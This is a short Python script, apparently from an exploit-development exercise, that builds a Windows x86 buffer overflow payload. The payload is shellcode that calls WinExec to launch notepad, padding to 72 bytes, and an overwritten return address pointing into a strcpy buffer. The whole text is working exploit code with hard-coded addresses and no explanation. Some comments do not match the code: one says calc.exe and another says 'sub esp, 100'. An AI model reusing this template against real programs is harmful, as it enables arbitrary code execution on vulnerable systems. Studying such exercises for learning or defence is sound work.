
buf = ""
# --------------- sub esp, 100----------------
buf += "\x8B\xC4"               # mov eax, esp
buf += "\x80\xEC\x01"           # sub ah, 1
buf += "\x8B\xE0"               # mov esp, eax
# --------------- push @notepad.exe ----------------
buf += "\x31\xc0"               # xor eax, eax
buf += "\x50"                   # push eax
buf += "\x68exe."               # push 0x2e657865
buf += "\x68pad."               # push 0x2e646170
buf += "\x68note"               # push 0x65746f6e   
buf += "\x8b\xc4"               # mov eax, esp
# --------- push the paramaters for WinExec ----------
buf += "\x6A\x05"               # push 5 => to show the window
buf += "\x50"                   # push eax => this reg point to start of the string calc.exe
buf += "\xB8\x1f\xcf\x49\x75"   # mov eax, WinExec (1f insted of 20) (need to get the address from the debuger)
buf += "\x40"                   # inc eax (adding 1 to 1f to get 20)
buf += "\xFF\xD0"               # call eax
buf += "A" * (72 - len(buf))
buf += "\xdc\xfe\x19\x00"       # the address of the second paramter "buff" in strcpy 
                            
print(buf)
